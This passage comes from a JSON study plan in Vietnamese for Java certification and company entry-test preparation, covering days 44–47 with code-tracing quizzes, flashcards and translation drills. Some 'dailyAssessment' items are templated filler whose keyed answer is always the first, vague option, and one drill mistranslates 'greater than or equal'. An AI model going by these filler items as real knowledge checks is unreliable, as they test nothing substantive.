          "desc": "Tránh nạp class đệ quy trong static init",
          "questions": [
            {
              "q": "Nếu trong khối `static { ... }` của class A tạo một đối tượng của class B, và khối static của class B cũng tạo đối tượng của class A, điều gì sẽ xảy ra trong JVM?",
              "ans": "Xảy ra hiện tượng deadlock giữa các luồng nạp class của JVM hoặc ném ngoại lệ `java.lang.ExceptionInInitializerError`."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_44_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Tập trung vào câu hỏi Exception & Flow control?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Tập trung vào câu hỏi Exception & Flow control phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Tập trung vào câu hỏi Exception & Flow control."
        },
        {
          "id": "da_44_2",
          "q": "Khi thao tác với Tập trung vào câu hỏi Exception & Flow control, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Dấu hiệu nhận biết nhanh một câu hỏi có đáp án là Compile Error trong TestKing?",
          "a": "1. Sai Access Modifier (private/protected ở top class, hạ quyền khi override).\n2. Gán kiểu lớn cho kiểu nhỏ không ép kiểu (`int` vào `byte`, `double` vào `float`).\n3. Dùng biến local chưa khởi tạo.\n4. Sai cấu trúc switch (kiểu double, duplicate case).\n5. Câu lệnh unreachable sau return.",
          "trap": "Quét thấy 1 trong các lỗi này là chọn ngay Compile Error không cần đọc tiếp."
        }
      ],
      "dailyEnglish": [
        {
          "id": 51,
          "vi": "Chuyển đến trang ABC khi người dùng click button xxx",
          "en": "forward to ABC page when user clicks button xxx"
        },
        {
          "id": 52,
          "vi": "kiểm tra 1 dòng dữ liệu tồn tại trong cơ sở dữ liệu  thỏa mãn điều kiện trận đấu đó là trận đấu  gần nhất của 1 cặp thi đấu",
          "en": "Check 1 data row which exists in database, satisfying match conditions"
        },
        {
          "id": 53,
          "vi": "Tìm những cặp đấu đã từng thi đấu  với nhau ít nhất 2 lần",
          "en": "Search matches which have at least 2 times of competitions"
        },
        {
          "id": 54,
          "vi": "So sánh ngày thi đấu gần nhất với ngày  chuẩn bị chèn vào cơ sở dữ liệu",
          "en": "Compare the nearest match date with the inserted date in database"
        },
        {
          "id": 55,
          "vi": "mã trận đấu nên theo định dạng sau  ( không bắt buộc)",
          "en": "Match code should be in following format (un-required)"
        }
      ]
    },
    "45": {
      "day": 45,
      "week": 7,
      "title": "TestKing Lần 2 - Đợt 3 (50 câu)",
      "topics": [
        "Tập trung vào câu hỏi OOP Polymorphism & Inheritance"
      ],
      "tasks": [
        "Làm 50 câu TestKing",
        "Củng cố quy tắc method overriding"
      ],
      "englishDrill": [
        {
          "id": 54,
          "vi": "So sánh ngày thi đấu gần nhất với ngày  chuẩn bị chèn vào cơ sở dữ liệu",
          "en": "Compare the nearest match date with the inserted date in database"
        },
        {
          "id": 55,
          "vi": "mã trận đấu nên theo định dạng sau  ( không bắt buộc)",
          "en": "Match code should be in following format (un-required)"
        },
        {
          "id": 56,
          "vi": "Nếu A lớn hơn hoặc bằng B thì thực hiện update ngược lại  thì thông báo lỗi",
          "en": "If A is greater than B,  update, else, report errors"
        },
        {
          "id": 57,
          "vi": "Nếu A thõa mãn các điều kiện validate thì sẽ xử lý add vào object ngược lại thì thông báo lỗi",
          "en": "If A satisfies conditions of validation, add into object, else, report errors"
        },
        {
          "id": 58,
          "vi": "láy danh sách bảng theo Id abc",
          "en": "get table list by id abc"
        }
      ],
      "summary": "TestKing Vòng 2 - Đợt 3: Tốc độ cao < 45s/câu, độ chính xác mục tiêu > 90%.",
      "coreTheory": "\n### Mục tiêu Tuần 7:\n- Luyện phản xạ: Đọc câu hỏi nhận diện ngay bẫy nằm ở dòng nào trong vòng 15 giây.\n- Không nhìn đáp án, tự suy luận ra kết quả rồi mới so sánh.\n- Các câu sai được gom lại để xử lý dứt điểm vào Ngày 47.\n",
      "codeSnippet": "// Luyện tốc độ cao 50 câu/ngày",
      "traps": [
        "Làm nhanh nhưng không ẩu, luôn kiểm tra xem code có compile được không trước khi tính output."
      ],
      "quickQuiz": [
        {
          "q": "Tại sao khi ghi đè `equals()` ta bắt buộc phải ghi đè cả `hashCode()`?",
          "a": "Để duy trì hợp đồng (Contract): Hai object bằng nhau theo `equals()` thì BẮT BUỘC phải có cùng `hashCode()`. Nếu vi phạm, các Collections dựa trên băm như HashSet, HashMap sẽ không tìm thấy hoặc lưu trùng lặp object."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Tập trung vào câu hỏi OOP Polymorphism & Inheritance.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Mục tiêu Tuần 7:\n- Luyện phản xạ: Đọc câu hỏi nhận diện ngay bẫy nằm ở dòng nào trong vòng 15 giây.\n- Không nhìn đáp án, tự suy luận ra kết quả rồi mới so sánh.\n- Các câu sai được gom lại để xử lý dứt điểm vào Ngày 47.\n",
          "code": "// Luyện tốc độ cao 50 câu/ngày"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d45_1",
          "level": "Hard",
          "question": "Đoạn code sau in ra gì khi gọi phương thức đa hình kết hợp biến tĩnh?",
          "code": "class Parent {\n    static void print() { System.out.print(\"P \"); }\n}\nclass Child extends Parent {\n    static void print() { System.out.print(\"C \"); }\n}\npublic class StaticPolymorph {\n    public static void main(String[] args) {\n        Parent p = new Child();\n        p.print();\n    }\n}",
          "options": [
            "P ",
            "C ",
            "Compile Error",
            "Runtime Exception"
          ],
          "correctIndex": 0,
          "explanation": "Phương thức tĩnh (`static`) KHÔNG có tính đa hình runtime, nó thuộc về Class và bị ẩn (hiding). Khi gọi `p.print()`, trình biên dịch sử dụng kiểu khai báo của biến `p` (là `Parent`) để liên kết phương thức tại compile-time. Do đó phương thức `print()` của `Parent` được gọi, in ra `P `."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Làm nhanh nhưng không ẩu, luôn kiểm tra xem code có compile được không trước khi tính output.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Luyện tốc độ cao 50 câu/ngày",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Phản xạ tốc độ cao: Collections & Concurrency",
          "questions": [
            {
              "q": "Cấu trúc dữ liệu nào trong Java cài đặt hàng đợi hai đầu (Double-ended Queue)?",
              "ans": "`ArrayDeque` hoặc `LinkedList`."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Compare-And-Swap (CAS)",
          "questions": [
            {
              "q": "Cơ chế CAS (Compare-And-Swap) được sử dụng trong các lớp `AtomicInteger`, `AtomicReference` hoạt động như thế nào?",
              "ans": "Là chỉ thị phần cứng CPU nguyên tử (atomic): Nó so sánh giá trị hiện tại của biến ở ô nhớ với giá trị kỳ vọng (expected value); nếu khớp thì hoán đổi sang giá trị mới (new value), nếu không khớp thì thử lại (spin loop) mà không cần khóa luồng (Lock-free)."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace Iterator remove vs List remove",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nList<String> list = new ArrayList<>(Arrays.asList(\"A\", \"B\", \"C\"));\nfor (Iterator<String> it = list.iterator(); it.hasNext(); ) {\n    String s = it.next();\n    if (\"B\".equals(s)) it.remove();\n}\nSystem.out.println(list.size());\n```\nKết quả in ra là gì?",
              "ans": "In ra: 2. Gọi `it.remove()` là cách an toàn duy nhất để xóa phần tử khi đang duyệt danh sách, nó tự động cập nhật biến `expectedModCount` nên không gây ra `ConcurrentModificationException`."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy TreeSet sắp xếp phần tử bị thay đổi thuộc tính",
          "questions": [
            {
              "q": "Nếu sửa đổi thuộc tính sắp xếp của một đối tượng đã được thêm vào `TreeSet`, đối tượng đó có tự động đổi chỗ không?",
              "ans": "Không tự động đổi chỗ! `TreeSet` chỉ xác định vị trí tại thời điểm gọi `add()`. Việc sửa đổi dữ liệu sau đó sẽ làm hỏng cấu trúc cây nhị phân (broken binary tree invariants)."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "ThreadPoolExecutor RejectedExecutionHandler",
          "questions": [
            {
              "q": "Khi hàng đợi `BlockingQueue` đã đầy và số lượng thread trong ThreadPool đã chạm ngưỡng `maxPoolSize`, chính sách từ chối mặc định là gì?",
              "ans": "`AbortPolicy` (ném ngoại lệ `RejectedExecutionException`). Các chính sách khác: `CallerRunsPolicy`, `DiscardPolicy`, `DiscardOldestPolicy`."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_45_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Tập trung vào câu hỏi OOP Polymorphism & Inheritance?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Tập trung vào câu hỏi OOP Polymorphism & Inheritance phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Tập trung vào câu hỏi OOP Polymorphism & Inheritance."
        },
        {
          "id": "da_45_2",
          "q": "Khi thao tác với Tập trung vào câu hỏi OOP Polymorphism & Inheritance, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Quy tắc nhẩm nhanh đa hình method vs trường (field) khi gọi `Parent p = new Child()`?",
          "a": "- Gọi method: Chạy phương thức đã được override của `Child` (Runtime polymorphism).\n- Truy cập field (biến): Lấy giá trị biến khai báo trong `Parent` (Compile-time binding).",
          "trap": "Biến không bao giờ có tính đa hình, chỉ có instance method mới có đa hình!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 54,
          "vi": "So sánh ngày thi đấu gần nhất với ngày  chuẩn bị chèn vào cơ sở dữ liệu",
          "en": "Compare the nearest match date with the inserted date in database"
        },
        {
          "id": 55,
          "vi": "mã trận đấu nên theo định dạng sau  ( không bắt buộc)",
          "en": "Match code should be in following format (un-required)"
        },
        {
          "id": 56,
          "vi": "Nếu A lớn hơn hoặc bằng B thì thực hiện update ngược lại  thì thông báo lỗi",
          "en": "If A is greater than B,  update, else, report errors"
        },
        {
          "id": 57,
          "vi": "Nếu A thõa mãn các điều kiện validate thì sẽ xử lý add vào object ngược lại thì thông báo lỗi",
          "en": "If A satisfies conditions of validation, add into object, else, report errors"
        },
        {
          "id": 58,
          "vi": "láy danh sách bảng theo Id abc",
          "en": "get table list by id abc"
        }
      ]
    },
    "46": {
      "day": 46,
      "week": 7,
      "title": "TestKing Lần 2 - Đợt 4 (50 câu)",
      "topics": [
        "Tập trung vào Collections, Threads & Inner classes"
      ],
      "tasks": [
        "Làm 50 câu TestKing",
        "Kiểm tra độ nhớ về wait/notify monitor locks"
      ],
      "englishDrill": [
        {
          "id": 57,
          "vi": "Nếu A thõa mãn các điều kiện validate thì sẽ xử lý add vào object ngược lại thì thông báo lỗi",
          "en": "If A satisfies conditions of validation, add into object, else, report errors"
        },
        {
          "id": 58,
          "vi": "láy danh sách bảng theo Id abc",
          "en": "get table list by id abc"
        },
        {
          "id": 59,
          "vi": "xóa bảng với điều kiện id= abc",
          "en": "Delete table if id=abc"
        },
        {
          "id": 60,
          "vi": "commnet cho hàm override ở actionclass",
          "en": "comment for override function at actionclass"
        },
        {
          "id": 61,
          "vi": "comment cho các hàm getter setter ở bean",
          "en": "comment for getter setter function at bean"
        }
      ],
      "summary": "TestKing Vòng 2 - Đợt 4: Tốc độ cao < 45s/câu, độ chính xác mục tiêu > 90%.",
      "coreTheory": "\n### Mục tiêu Tuần 7:\n- Luyện phản xạ: Đọc câu hỏi nhận diện ngay bẫy nằm ở dòng nào trong vòng 15 giây.\n- Không nhìn đáp án, tự suy luận ra kết quả rồi mới so sánh.\n- Các câu sai được gom lại để xử lý dứt điểm vào Ngày 47.\n",
      "codeSnippet": "// Luyện tốc độ cao 50 câu/ngày",
      "traps": [
        "Làm nhanh nhưng không ẩu, luôn kiểm tra xem code có compile được không trước khi tính output."
      ],
      "quickQuiz": [
        {
          "q": "Trạng thái nào của Thread xảy ra khi thread đang chờ giải phóng khóa Lock trong khối `synchronized`?",
          "a": "Trạng thái `BLOCKED` (chờ monitor lock để vào hoặc tái nhập khối synchronized)."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Tập trung vào Collections, Threads & Inner classes.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Mục tiêu Tuần 7:\n- Luyện phản xạ: Đọc câu hỏi nhận diện ngay bẫy nằm ở dòng nào trong vòng 15 giây.\n- Không nhìn đáp án, tự suy luận ra kết quả rồi mới so sánh.\n- Các câu sai được gom lại để xử lý dứt điểm vào Ngày 47.\n",
          "code": "// Luyện tốc độ cao 50 câu/ngày"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d46_1",
          "level": "Hard",
          "question": "Đoạn code sau sử dụng TreeSet cho kết quả gì?",
          "code": "import java.util.*;\npublic class TreeSetTrap {\n    public static void main(String[] args) {\n        Set<String> set = new TreeSet<>();\n        set.add(\"Orange\");\n        set.add(\"Apple\");\n        set.add(\"Banana\");\n        for (String s : set) System.out.print(s + \" \");\n    }\n}",
          "options": [
            "Apple Banana Orange ",
            "Orange Apple Banana ",
            "Banana Apple Orange ",
            "Compile Error"
          ],
          "correctIndex": 0,
          "explanation": "`TreeSet` tự động sắp xếp các phần tử theo thứ tự tự nhiên (Natural ordering - từ điển alphabet theo bảng mã Unicode). Do đó các từ được sắp xếp lại theo thứ tự A -> B -> O: `Apple Banana Orange `."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Làm nhanh nhưng không ẩu, luôn kiểm tra xem code có compile được không trước khi tính output.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Luyện tốc độ cao 50 câu/ngày",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Phản xạ tốc độ cao: Tổng hợp Ch8-9",
          "questions": [
            {
              "q": "Gói mở rộng nào trong Java cung cấp các lớp định dạng ngày giờ mới bất biến (Immutable) từ Java 8?",
              "ans": "Gói `java.time` (với các lớp `LocalDate`, `LocalTime`, `LocalDateTime`, `Instant`)."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Java NIO vs IO truyền thống",
          "questions": [
            {
              "q": "Sự khác biệt cốt lõi giữa Java IO và Java NIO là gì?",
              "ans": "Java IO truyền thống hoạt động theo hướng dòng dữ liệu (Stream-oriented) và chặn luồng (Blocking IO). Java NIO hoạt động theo hướng bộ đệm (Buffer-oriented), kênh kết nối (Channel) và không chặn luồng (Non-blocking IO với Selector)."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace java.time.Period",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nLocalDate date = LocalDate.of(2026, 1, 1);\nPeriod period = Period.ofDays(10);\ndate.plus(period);\nSystem.out.println(date.getDayOfMonth());\n```\nKết quả in ra là gì?",
              "ans": "In ra: 1 (không phải 11!). Do `LocalDate` là đối tượng BẤT BIẾN (immutable). Hàm `date.plus(period)` trả về một đối tượng mới nhưng không được gán lại vào biến `date`, nên `date` ban đầu không thay đổi."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy khởi tạo LocalDate",
          "questions": [
            {
              "q": "Có thể khởi tạo đối tượng bằng `new LocalDate(2026, 1, 1)` được không?",
              "ans": "Không thể! Constructor của `LocalDate` là `private`. Bắt buộc phải khởi tạo thông qua factory method tĩnh: `LocalDate.of(...)` hoặc `LocalDate.parse(...)`."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "DateTimeFormatter thread-safety",
          "questions": [
            {
              "q": "Tại sao nên dùng `DateTimeFormatter` thay vì `SimpleDateFormat` trong môi trường đa luồng?",
              "ans": "`SimpleDateFormat` là thread-unsafe (gây sai lệch ngày khi nhiều luồng cùng gọi). `DateTimeFormatter` từ Java 8 là immutable và thread-safe 100%."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_46_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Tập trung vào Collections, Threads & Inner classes?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Tập trung vào Collections, Threads & Inner classes phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Tập trung vào Collections, Threads & Inner classes."
        },
        {
          "id": "da_46_2",
          "q": "Khi thao tác với Tập trung vào Collections, Threads & Inner classes, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Cấu trúc dữ liệu nào trong Java Collections đảm bảo vừa không trùng lặp vừa duy trì thứ tự chèn?",
          "a": "`LinkedHashSet`. Nó kết hợp giữa bảng băm (đảm bảo tính duy nhất của phần tử O(1)) và danh sách liên kết đôi (duy trì thứ tự các phần tử khi được chèn vào).",
          "trap": "HashSet không giữ thứ tự, TreeSet thì tự sắp xếp tăng dần."
        }
      ],
      "dailyEnglish": [
        {
          "id": 57,
          "vi": "Nếu A thõa mãn các điều kiện validate thì sẽ xử lý add vào object ngược lại thì thông báo lỗi",
          "en": "If A satisfies conditions of validation, add into object, else, report errors"
        },
        {
          "id": 58,
          "vi": "láy danh sách bảng theo Id abc",
          "en": "get table list by id abc"
        },
        {
          "id": 59,
          "vi": "xóa bảng với điều kiện id= abc",
          "en": "Delete table if id=abc"
        },
        {
          "id": 60,
          "vi": "commnet cho hàm override ở actionclass",
          "en": "comment for override function at actionclass"
        },
        {
          "id": 61,
          "vi": "comment cho các hàm getter setter ở bean",
          "en": "comment for getter setter function at bean"
        }
      ]
    },
    "47": {
      "day": 47,
      "week": 7,
      "title": "Diệt Cỏ Câu Sai (Nhóm sai >= 2 lần)",
      "topics": [
        "Lọc toàn bộ những câu đã sai ở vòng 1 hoặc vòng 2"
      ],
      "tasks": [
        "Làm lại từng câu sai kèm giải thích tại sao đáp án đó đúng",
        "Cam kết không sai lại lần 3"
      ],
      "englishDrill": [
        {
          "id": 60,
          "vi": "commnet cho hàm override ở actionclass",
          "en": "comment for override function at actionclass"
        },
        {
          "id": 61,
          "vi": "comment cho các hàm getter setter ở bean",
          "en": "comment for getter setter function at bean"
        },
        {
          "id": 62,
          "vi": "đếm số record ở database",
          "en": "Count number of record in database"
        },
        {
          "id": 63,
          "vi": "Tạo list A lấy từ database lên",
          "en": "Create list A from database"
        },
        {
          "id": 64,
          "vi": "Lấy danh sách từ DB và đẩy vào danh sách",
          "en": "Get data from database and show on list"
        }
      ],
      "summary": "DIỆT CỎ CÂU SAI: Lọc và làm lại toàn bộ các câu hỏi đã từng làm sai từ vòng 1.",
      "coreTheory": "\n### Nguyên tắc Diệt Cỏ:\n- Những câu sai $\\ge 2$ lần là điểm yếu chí tử của bạn trong phòng thi.\n- Phải tự viết lại code của câu sai vào IDE, chạy thử và ghi lý do mình bị lừa vào Sổ Lỗi (Error Book).\n- Cam kết không bao giờ lặp lại lỗi đó lần thứ 3.\n",
      "codeSnippet": "// Rà soát lại Error Book trên Web App",
      "traps": [
        "Chủ quan tưởng mình đã nhớ nhưng khi gặp lại biến thể khác vẫn bị lừa."
      ],
      "quickQuiz": [
        {
          "q": "Trong Spring Boot, annotation `@Autowired` tiêm dependency theo kiểu nào được khuyến nghị tốt nhất: Field Injection hay Constructor Injection?",
          "a": "Constructor Injection! Vì đảm bảo tính bất biến (immutability với `final`), ngăn chặn NullPointerException, dễ dàng viết Unit Test mà không cần Spring context."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Lọc toàn bộ những câu đã sai ở vòng 1 hoặc vòng 2.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Nguyên tắc Diệt Cỏ:\n- Những câu sai $\\ge 2$ lần là điểm yếu chí tử của bạn trong phòng thi.\n- Phải tự viết lại code của câu sai vào IDE, chạy thử và ghi lý do mình bị lừa vào Sổ Lỗi (Error Book).\n- Cam kết không bao giờ lặp lại lỗi đó lần thứ 3.\n",
          "code": "// Rà soát lại Error Book trên Web App"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_d47_1",
          "level": "Hard",
          "question": "Dự đoán kết quả in ra của đoạn code nối chuỗi sau:",
          "code": "public class StringConcatTrap {\n    public static void main(String[] args) {\n        System.out.println(1 + 2 + \"3\" + 4 + 5);\n    }\n}",
          "options": [
            "3345",
            "12345",
            "339",
            "15"
          ],
          "correctIndex": 0,
          "explanation": "Toán tử `+` có độ ưu tiên từ trái sang phải: \n1. `1 + 2` là phép cộng số học giữa 2 số nguyên -> cho kết quả `3`.\n2. `3 + \"3\"` gặp chuỗi nên chuyển sang phép nối chuỗi -> thành `\"33\"`.\n3. `\"33\" + 4` tiếp tục nối chuỗi -> thành `\"334\"`.\n4. `\"334\" + 5` tiếp tục nối chuỗi -> thành `\"3345\"`."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Chủ quan tưởng mình đã nhớ nhưng khi gặp lại biến thể khác vẫn bị lừa.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// Rà soát lại Error Book trên Web App",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Chiến thuật xử lý câu hỏi hóc búa",
          "questions": [
            {
              "q": "Phương pháp loại trừ hiệu quả nhất khi làm bài thi trắc nghiệm Java là gì?",
              "ans": "1) Quét lỗi Compile Error trước (modifier xung đột, import trùng, chưa khởi tạo biến local). 2) Quét lỗi Runtime (ClassCastException, NullPointerException). 3) Kiểm tra giá trị logic."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Phân tích bẫy đề thi FSOFT Entry Test",
          "questions": [
            {
              "q": "Ba dạng câu hỏi chiếm tỷ lệ mất điểm cao nhất trong kỳ thi Entry Test là gì?",
              "ans": "1) Phép gán và toán tử tăng giảm (`x = x++`). 2) Kế thừa và thứ tự khởi tạo static/instance blocks. 3) Cơ chế String Constant Pool vs Heap."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace bài toán tổng hợp phân cấp kế thừa",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nclass Alpha {\n    String getType() { return \"alpha\"; }\n}\nclass Beta extends Alpha {\n    String getType() { return \"beta\"; }\n}\npublic class Gamma extends Beta {\n    String getType() { return \"gamma\"; }\n    public static void main(String[] args) {\n        Alpha g1 = new Beta();\n        Beta g2 = new Gamma();\n        System.out.println(g1.getType() + \" \" + g2.getType());\n    }\n}\n```\nKết quả in ra là gì?",
              "ans": "In ra: `beta gamma`. Vì cả 2 biến đều gọi phương thức ảo (virtual method), phương thức thực thi tương ứng với đối tượng thực tế tạo trên Heap: `new Beta()` gọi `Beta.getType()` trả về \"beta\", `new Gamma()` gọi `Gamma.getType()` trả về \"gamma\"."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy package-private trong kế thừa khác gói",
          "questions": [
            {
              "q": "Nếu class cha khai báo `void doStuff() {}` (default) và class con ở gói khác khai báo `public void doStuff() {}`, đây có phải là override không?",
              "ans": "KHÔNG phải là override! Do class con ở package khác không nhìn thấy phương thức default của cha, nên phương thức trong class con là một phương thức hoàn toàn mới (không có tính đa hình runtime liên kết với cha)."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Tối ưu bộ nhớ với Flyweight Pattern",
          "questions": [
            {
              "q": "Tính năng nào của Java Core áp dụng trực tiếp mẫu thiết kế Flyweight Pattern?",
              "ans": "String Constant Pool và Integer Cache (-128 đến 127) giúp tái sử dụng các đối tượng bất biến để tiết kiệm bộ nhớ Heap."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_47_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Lọc toàn bộ những câu đã sai ở vòng 1 hoặc vòng 2?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Lọc toàn bộ những câu đã sai ở vòng 1 hoặc vòng 2 phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Lọc toàn bộ những câu đã sai ở vòng 1 hoặc vòng 2."
        },
        {
          "id": "da_47_2",
          "q": "Khi thao tác với Lọc toàn bộ những câu đã sai ở vòng 1 hoặc vòng 2, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
